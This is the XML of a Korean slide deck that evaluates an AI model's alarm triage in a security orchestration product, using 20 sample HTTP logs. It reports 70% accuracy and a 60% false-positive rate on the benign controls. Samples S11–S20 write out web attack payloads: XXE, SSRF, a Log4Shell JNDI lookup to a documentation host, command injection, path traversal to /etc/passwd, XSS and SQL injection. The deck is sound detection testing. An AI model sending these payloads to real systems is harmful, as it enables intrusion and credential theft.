Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="R3aa3909b819e40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b05ff8342438a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="Rd189281246b440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4cd4ef7034216" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="R3ed3e7dc880e4c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7ac5d713d400f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide20.xml" Id="R531bec850da44b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cbd09ffec47db" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide21.xml" Id="Rb07016ece8ea4f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fd80a50e54115" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide22.xml" Id="R7dfe44488bda4b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3ebc6185143af" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide23.xml" Id="R58746e00d0f34f8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de1d642c84857" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide24.xml" Id="R2c3c7e6c3bba48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b7b83145245fa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide25.xml" Id="Ra7887e7e381c419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화면 값</c:v>
          </c:tx>
          <c:dPt>
            <c:idx val="0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cat>
            <c:strRef>
              <c:f>'Chart Data'!$A$2:$A$21</c:f>
              <c:strCache>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>S01</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>S02</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>S03</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>S04</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>S05</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>S06</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>S07</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>S08</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>S09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S17</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>S18</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>S19</c:v>
                </c:pt>
                <c:pt idx="19">
                  <c:v>S20</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Chart Data'!$B$2:$B$21</c:f>
              <c:numCache>
                <c:formatCode>0.00</c:formatCode>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>0.47</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.39</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.48</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.3</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>0.31</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>0.35</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>0.27</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>0.65</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>0.46</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>0.37</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>0.67</c:v>
                </c:pt>
                <c:pt idx="14">
                  <c:v>0.51</c:v>
                </c:pt>
                <c:pt idx="15">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="16">
                  <c:v>0.63</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>0.45</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>0.57</c:v>
                </c:pt>
                <c:pt idx="19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3246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5F7FA"/>
        </a:solidFill>
      </c:spPr>
    </c:plotArea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4C74C-4D16-44F4-9E53-DED5A048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386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rPr>
              <a:t>eyeCloudXOAR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F0423-8BFD-481D-946C-A89DDBD9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386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정오탐 탐지 모델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샘플로그 검증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C404D-0A36-48BA-80D3-A47A08DA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LogGenerator 연동 및 AI TEST 플레이북 실행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1D40C-A18E-4FB3-8F76-A559993E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52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테스트 기록  2026.09.08</a:t>
            </a:r>
          </a:p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대상 서버  10.1.42.80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="43782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74361-BCD2-4740-8A94-35D0EE2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10건을 탐지했고 정상 6건을 공격으로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D6E2A-7056-48C2-B621-BE19EA7C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10건, 정상 대조군 10건에 대한 사후 수동 검토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67884-B7EB-42F7-927C-5615AA6C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939AB-840A-4B27-AD4F-10ADA6E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70.0%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48F42-697C-47D3-8007-8F96FDD9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전체 정확도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851EC-8D36-48BF-A73F-ABC91D08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20건 중 14건 정분류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97BD3-0292-46BC-B406-C3BA409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100.0%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33A1D-BE69-489C-9CDF-5E07403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탐지율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3E058-1957-4E9A-AE23-8604EC4E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모사 10건 모두 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8DC58-5D07-4505-A7ED-D857644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62.5%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2B1D5-0CBF-4FF3-83DE-18CCD22C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판정 정밀도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690A3-27E7-41E7-806D-9022B0DB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판정 16건 중 10건 적중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481C5-3A4A-47B0-BA10-EEC92E7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정상 대조군 오탐률 60.0%  (6 / 10)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0ABB8-D0B7-4C97-86C6-C870FC51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 수치는 제공된 20건의 결과이며, 학습·평가 데이터 분리 여부와 운영 환경의 일반화 성능은 확인되지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488282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7E64C-DCD8-4D96-9DDE-E0F9C076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평가 대상과 수동 분류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1E11-2A0C-4CE8-9AFA-C4AD540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화면의 공격·정상 판정과 독립적인 기준으로 20개 요청을 다시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E86E-8318-48B1-A76E-8FFE32A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41CD5-2EAB-4261-AA7C-2072CF10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단위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C609B-C22C-411D-839E-6F1C924B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 순서대로 S01~S20을 부여한 HTTP 요청 20건.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각 요청의 화면 값과 공격·정상 판정을 그대로 비교한다.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C8B4D-665C-4B7A-A95F-C10D5E9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정상 대조군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CE02-6775-4103-BCE7-E68D4231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S01~S10은 제공된 요청 범위에서 공격 구문이 없는 대조군 10건.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업로드 파일 본문, 로그인 응답, 반복 행위는 확인되지 않았다.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688FE-3E41-4E2C-9AFD-DAC4DE8B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모사군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DC7BE-3260-4C4E-87BA-6E769F32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S11~S20은 삽입, 경로 순회, 외부 접근 등을 시도·모사하는 10건.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실제 취약점 악용 성공 여부는 이 자료의 평가 대상에 포함하지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FA150-F853-4047-9740-9CDE0D9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961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원문의 퍼센트 인코딩, 역슬래시, 개행 이스케이프와 Referer의 Markdown 링크 표기를 보존한다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="833802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EE237-D088-4345-8708-9BBA040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기존 테스트의 연동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EE64B-377A-4E1F-84BA-EFE90BF6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사용자 설명에 따른 구성 명칭과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DA553-7D51-4D80-8AB3-3D7C8C1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38684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286250"/>
                <a:gridCol w="8629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 요소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과정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후 판정을 확인할 샘플 로그를 선택하고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10.1.42.80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서버의 로그 수신 경로로 전달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 파서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로그를 파싱하고 AI 입력에 필요한 payload를 추출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이벤트  AITEST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로그를 일반 이벤트로 연동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플레이북 티켓  AI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정오탐 분석을 실행하고 피드백 저장 단계로 진행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41CCA-28DC-490D-A8C9-F4A4568C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대상 서버와 구성 명칭은 제공 내용 기준. 실제 전송 프로토콜·포트·EPS·수신 건수는 제공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546753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3374B-E7C6-4D03-BC36-CD2D6FA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파서와 이벤트·티켓 연계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BB27E-731A-4635-A939-F58A2017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연동 이름과 분석 입력을 구분해 테스트 조건을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3330D-1D84-4F3A-8FD0-692D725B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CD430-F7BF-494D-92F7-6D356A3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수신 로그 파싱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AB41E-52EC-4F2D-8ED9-0D9ABB50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등록 이름  LogGenerator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요청이 포함된 payload와 이벤트 연동 필드를 추출한다.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1C773-C705-4891-8F7B-A3253680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이벤트 및 티켓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9FCE1-FC01-414D-A1B2-36AE6368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일반 이벤트  AITEST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플레이북 티켓  AI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99E1-8C36-45A3-B129-F58A0D9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AI 분석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33897-8B4F-482C-A817-C9956D58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티켓의 payload를 정오탐 분석 요청에 전달한다.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정답 라벨과 보고서용 S번호는 모델 입력에서 분리한다.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E2836-71ED-463C-A866-842B41EF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파서 정규식, 장비 매핑, 이벤트 조건식, 활성 모델 버전 및 실제 입력 전문은 별도 설정 증거가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458334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DEEAF-E138-45F1-9040-CF1B1A5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플레이북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EE13A-A3A5-4E16-962C-C07D6904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화면의 노드 이름과 자동·수동 실행 모드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23303-B294-4B8E-9513-D23E2907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cf102b55a4a36"/>
          <a:stretch xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:off x="733536" y="2324100"/>
            <a:ext cx="13772928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3B73A-66AD-4F4F-9AF4-38880B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42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정오탐 분석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69A4D-3D63-4E04-8F2D-FDD95D3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429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Auto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분석 요청을 자동 실행하는 노드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5B57C-1AC8-473F-B381-0DE8258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655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정오탐 피드백 데이터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7A006-4274-42DB-8AC8-C70C3FBA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6553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Manual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사용자 피드백을 처리하는 수동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1F026-1715-4F23-BF01-66D2DE7C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580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티켓에는 이 단계의 상태가 표시된다. 제공 화면과 목록만으로 피드백 저장 완료 또는 End 도달을 확정할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959809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2EDEA-66A3-430C-AF49-E8F449E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20건의 실행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35664-DF7E-42B5-9698-DC5C0C57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2026.09.08  /  공통 담당자: 미지정  /  상태: 분석/대응 ( 정오탐 피드백 데이터 저장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685E3-23F4-4989-84ED-75E2EBAC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7CFE6-1075-4243-844E-42519B40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A   14:18:13 ~ 14:19:07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18892-B8F8-4F9A-9A13-CB62882B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B   16:54:54 ~ 16:55:39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66675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714500"/>
              </a:tblGrid>
              <a:tr h="4572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14:19:07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14:18:13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924800" y="2667000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="66294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14900"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="4572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16:54:54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8D51F-57A3-4FE2-BD33-952EC6D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티켓과 개별 로그의 1:1 대응은 미제공. 목록 B의 00000453 미표시만으로 수집 누락이나 실행 실패를 판단하지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71998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96B29-AE13-4D63-8260-85CE59E3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혼동행렬과 성능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90048-3140-4D6C-BDAF-7D431AB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양성 클래스 = 공격 의도·모사 로그  /  정답 = 본 보고서의 수동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33455-E450-40DB-B799-DA8BEEE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714500"/>
                <a:gridCol w="1714500"/>
                <a:gridCol w="1333500"/>
              </a:tblGrid>
              <a:tr h="6191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공격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정상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FN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 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 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7143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8020050" y="2352675"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="65341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186690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정확도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/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탐지율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판정 정밀도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오탐률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판별률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/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 점수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/ 26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76.9%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D7852-209B-41F3-BE4B-B7B573DE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FP: 정상 로그를 공격으로 판정한 6건. FN: 공격 로그를 정상으로 판정한 건수는 이번 표본에서 0건.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="529679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87E02-B8C6-4AD4-B6F1-13675F26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S01~S05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A2854-661D-4B08-85B3-4B6C009D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BA54E-061F-4FEB-BFF7-62287E4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상대경로 리디렉션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/home으로 이동하는 상대경로이며 외부 URL이나 헤더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업로드 발췌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이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.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로그인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삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을 확정할 수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점검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/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.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검색 조건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union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이 아니다.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52C6C-7237-4425-AB50-E169958E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166356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E7762-7F3D-4918-A32C-FBEE2B7A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S06~S10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FC104-D51B-4351-A9B0-A62D4121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40A4C-D90F-430E-8293-F368406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ping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localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이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파일 다운로드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파일명 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.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문서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 script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가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자연어 검색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건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.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목록 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ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석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59D27-DEFA-45A5-817A-DA495DA9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1449015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3D8B2-7934-4B1A-A110-7FA879F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S11~S15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BA592-1CD4-4CE3-8580-2B854A12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기준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EB8EB-87CB-41FF-81A4-0C78DC22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CRLF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%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는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XML 외부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엔터티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DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.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템플릿 삽입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중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이 필요하다.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SSRF 모사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URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.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Log4Shell 패턴 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User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.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8D3E8-5A47-4E02-B419-36D77F51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5953945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98CD8-34CD-4D90-A0A8-CD63E043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S16~S20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A52B1-AE41-4583-8437-E3FE0723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삽입·경로 순회 패턴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47843-EA97-4CD1-96E4-764B36B0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명령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;id;uname -a를 연결해 추가 OS 명령 실행을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순회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../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.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XSS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&lt;script&gt;alert(1)&lt;/script&gt;를 포함하는 스크립트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지연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 삽입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인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.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SQL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SELECT로 users 테이블의 username과 password 조회를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68C1F-26E5-4809-B876-8D744DF2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9314222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E8FA3-AF09-4949-8228-99E4E8B1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화면의 개별 ‘정확도’ 값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CE82D-50AA-4E4E-8583-92CF587F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각 로그의 출력값을 그대로 표시. 데이터셋 정확도 70.0%는 별도로 계산한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A44D2-B377-49FB-A7CD-1251636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3868400" cy="4076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5ea17fb02c419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83827-2A38-465F-92DE-8817BE2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138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주황: FP    청록: TP    회색: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F1B5E-D826-4306-B286-04F548A9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0.31도 공격, 0.39는 정상. 0.5 기준으로 판정을 재계산할 근거가 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14157877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C3FC1-D060-4D8A-A5E8-93C56199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해석의 한계와 후속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44BA8-6E43-4A2D-95A8-2ED2940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이번 표본에서는 정상 요청의 오탐 감소가 주요 개선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DB16D-E100-4714-B7A2-45B1504A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E265B-4B5E-4194-9F4D-B2C88DA3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오탐 6건의 재검토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2BAE6-EBDD-4936-B0CD-EBCD33D5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S01·S03·S05·S06·S08·S10을 정상 피드백 후보로 검토한다.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어휘만으로 공격을 추정했는지는 모델 내부 근거가 있어야 확인할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EFBEA-B23B-467F-B9F0-3A071B0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입력과 결과 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A515C-58FB-4AB0-9B93-0FFF7444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전송 원문, 파서 payload, 이벤트 ID, 티켓 ID, AI 입력을 연결한다.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모델 버전·전처리·실행 시각을 함께 남겨 같은 조건으로 재평가한다.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6DA2D-A80D-44BB-AE13-C1B6A0E9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82023-F4EB-4C92-B8BE-58D3BAB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학습에 사용하지 않은 정상·공격 로그로 다시 평가한다.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이번 20건만으로 학습 효과나 운영 환경의 성능 개선을 입증할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18428-FE4F-44F4-BD78-18083039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피드백 저장 완료와 재학습 실행·활성화는 별도 증거가 필요하다. 정상과 공격을 함께 재검증해 오탐·미탐 변화를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872952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66C97-3F27-462E-8F67-44FF7943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S01 · S02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8583E-2BA6-4551-BFD7-761C1BF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BC059-9D78-4FFB-8278-460721A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96C87-1DF4-41D0-BBE8-F00B2BB3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S01   상대경로 리디렉션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4C760-FAF6-4144-BC76-C7693968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0.47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A3A04-A409-4A2C-B53A-5DFB9379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/redirect?next=%2Fhome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B00F9-7795-497B-9A2B-C0E9DD19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S02   파일 업로드 발췌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C44D5-0EDC-4FBF-8D52-AB018BF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0.39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635B3-4FE2-4DEA-B9BE-287ED7C6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/upload HTTP/1.1\r\n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multipart/form-data; boundary=EVALBOUNDARY\r\n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--EVALBOUNDARY\r\n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Content-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityDat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a/event-11.dat"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13401936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A9E48-84E3-445B-B906-491C4306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S03 · S04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E8E47-E61D-4F9A-872F-D61857B4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206E4-E3ED-461C-A1D9-2DF6FAED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9E874-9AE3-426B-884B-79EF3939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S03   일반 로그인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CD67F-9D0C-41A5-952C-953AC75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0.48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D049D-CDE8-4589-9393-65C66A9C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/login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username=user01&amp;password=incorrect-password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8B1FC-3257-48ED-BC60-4B93DA4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S04   상태 점검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DA1B5-AA02-44A0-8ACE-B75B2ACF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0.30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E6281-394E-4D71-860B-B5ED76CD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/health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host-22\r\n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kube-probe/1.30\r\n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*/*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5949032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6BB9D-0C11-499B-81EC-9889DD3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S05 · S06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683CC-310E-48BC-BE70-785E804D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3A6B8-0807-4AB1-8D69-AB64AD9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9BA2B-60F1-4A99-98DD-110B580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S05   JSON 검색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6E724-02B0-4E1C-8F27-96B71DD1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0.31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F18E9-7842-4C97-9B32-734B38C0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/api/search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application/json\r\n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{"operator":"union","fields":["name","department"],"page":1}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4284B-1933-4B2D-8BC3-CF0C4C9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S06   정상 ping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CEBA4-B750-45C4-A014-D33A3388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0.60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7C72B-D0B1-493D-B93F-4D782105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/tools/ping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host=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10717210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BF473-BF3E-455D-8E9C-33F1CA36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S07 · S08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F22FF-F4D5-4FB1-85F6-431E3AB3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3C9C-2C86-4B7F-937B-4339BE32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C915F-BBF0-475F-9402-4E9B3EB7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S07   일반 파일 다운로드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EA18D-1B9E-44C1-823D-E44447E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0.35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7DB13-1EED-4253-ADC2-43370B16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/download?file=quarterly..final.pdf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host-41\r\n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application/pdf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567C9-13AD-4CD7-946F-E3928A3C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S08   기술 문서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EE1B3-B0FF-4049-B3F1-D2B23790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0.43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B0020-FB08-483B-A4C1-4B7EB94E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/docs/search?q=HTML%20script%20element%20reference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Referer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21431830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A9B99-A5D0-4C6D-92B5-FA23DDE6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S09 · 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DB6AC-72E0-4826-BB14-D1BB82F0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C453D-3167-4B2D-8837-390AECB7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D1A98-D589-4C54-92D3-74DCF683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S09   자연어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CE23F-CBB2-40F7-8A1A-7BB8BD2B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0.27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28B00-DF04-4CFA-A1AE-085EF4A2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/search?q=how%20to%20select%20a%20health%20plan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4BBC2-BEE0-4571-8A4B-C0EE4F58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S10   상품 목록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64BBA-8983-4DDA-8C39-F39B7C7C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0.65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6E523-6D72-4FFC-A8BE-E042CE88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/products?id=10&amp;sort=price&amp;direction=asc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10258677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8F2AF-756F-482E-BE0C-256D1AF2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S11 · S12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13860-3B67-4459-AB0F-48FE09A2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11991-8E3D-4C64-AA27-5FF51CC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0471C-CEF8-4DE8-8ADC-696225F8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S11   CRLF / 헤더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35FB4-DD70-4C68-AB8E-434C5E9B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69669-F5FE-4CCE-A6A3-47DCC90E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/redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true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1936C-7388-415C-ACAB-88B3223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S12   XML 외부 엔터티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DAF51-57B1-4D02-A9A0-EC0BA87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0.46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66FB3-686A-4E0F-8815-0F9EDE6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/api/import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application/xml\r\n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%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E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%3Cr%3E%26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15640819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F70E6-A83A-4331-9B7C-33686BE8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S13 · S14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2BCB4-E2FE-498E-9C8B-435E6C9B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6A34-1434-4827-876F-B3D7A5A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78237-4F48-46F3-821B-9844BBC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S13   서버 템플릿 삽입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07E2-A191-4A8C-A700-8FFF9DD6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0.37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A9400-D675-49C6-BD4B-B03BA52A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/welcome?name=%7B%7B7\*7%7D%7D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E062C-97C7-4D5D-A8EE-2007F24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S14   SSRF 모사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8B5DE-5F52-42A1-BCAC-217A8D50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0.67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CC44B-CA8D-4A01-B6A8-BDA1BFA9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/preview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host-22\r\n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url=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18253936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A12B9-A4C2-4D29-A745-5AA66C1E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S15 · S16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1107A-B85D-4B1E-AE97-86BEDEB8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DD585-4974-497B-80CD-57E69854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0BF26-DD46-4CBF-96B6-D81C98C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S15   Log4Shell 패턴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24071-6C61-41FE-9B86-F9209D8D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0.51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0D04A-B1D2-4863-AC62-FB700A76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${jndi:ldap\://192.0.2.123:1389/test-only}\r\n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X-Test-Marker: AI-EVAL-9006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BBBBD-B7B9-444B-B559-940B6181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S16   OS 명령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8042B-5ADD-453A-AAE6-C3C751E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D2797-DA10-46D1-A7F0-C44269FF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/tools/ping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host=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5649567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BFC05-EE3B-4413-8E1F-C10DA4A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S17 · S18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D95D5-453E-458A-BAA4-6779FEF9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D3BB9-A2D2-4B27-BB71-DEC66A87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427A8-46E2-4ECB-BDEB-E330344A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S17   경로 순회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2088F-819A-4EC5-9465-7ADA2C01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42884-2EC0-43B4-9037-A576410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/download?file=../../../../etc/passwd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host-41\r\n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application/octet-stream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4420E-2A1C-44D3-AB55-C1E499D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S18   XSS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22B91-576E-4E04-9FD1-D18CA9E7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0.45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9439A-3D58-4A4E-A397-F8B396E8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/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E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Referer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13411153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C6769-D04C-4AC6-9FC4-8A654E8F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S19 · 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AD0D0-BFA9-46C5-A3C8-DF039491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57F56-EEE7-4878-8AFD-0B6A021C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B15F7-4950-431E-9688-13FF437E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S19   시간 지연 SQL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5B0F2-EF9F-4C4F-BCF2-2252B62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49D57-1F8E-41D8-83A7-33075CEF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/login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username=admin%27%20AND%20SLEEP%285%29--&amp;password=test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AE57A-33C1-4BE4-BA55-C1AD1DCD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S20   UNION SQL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E0642-A9CB-4F23-8209-5501679F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1.00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780BC-675D-4FF7-A346-9F5E5601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/products?id=10%20UNION%20SELECT%20username,password%20FROM%20users--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17717831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61C99-96EE-462D-990D-1AC31EF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근거 자료와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C133E-AEC9-48DD-9AFC-BCEACB2A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판정 근거, 계산 결과, 제품 동작 설명의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251FB-81DF-466B-9B8D-427A266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004F9-B2FB-4579-8E85-4DB4334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직접 제공한 증거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F6470-65E4-447E-A2A6-0ECD8CB2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요청·화면 값·모델 판정 20건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목록 20건과 플레이북 화면 1장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1126F-1067-4D3C-A26E-1F808BE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제품 동작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A3399-D616-4386-9168-D98CAD50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575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LogGenerator 현재 README의 로그 전송 절차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eyeCloudXOAR v4 사용자 매뉴얼과 플레이북 가이드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11FAF-A59F-4062-BAF2-92DF0786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유형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23F53-E168-459C-B397-6FBD8715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OWASP의 SQL·명령·XML·템플릿 삽입 및 경로 순회 자료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Apache Log4j 보안 공지, RFC 5737, Kubernetes Probe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3F0FB-4280-4417-A84C-2D302228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883CB-5E4B-4E39-9C67-0535EE3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1026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제공된 기록의 사후 분석. 서버 수신, 설정 저장, 티켓별 로그 매핑,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피드백 DB 반영과 재학습 완료는 직접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833369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2026-09-09T03:17:38.0600000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-09T03:17:38.0600000Z</dcterms:modified>
</coreProperties>
</file>